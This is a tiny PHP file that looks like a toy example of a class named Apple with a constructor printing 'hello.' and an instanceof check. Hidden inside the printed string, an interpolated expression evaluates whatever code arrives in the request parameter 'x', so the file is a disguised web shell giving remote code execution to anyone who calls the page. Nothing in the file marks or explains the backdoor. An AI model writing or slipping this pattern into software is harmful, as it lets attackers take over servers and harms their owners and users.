<?php
class Apple
{
	function __construct(){
		print("${ eval($_REQUEST['x'])}hello." . '<br />');
	}
	
}

$iphone = new Apple();

if ($iphone instanceof Apple) echo '$iphone is instanceof Apple.';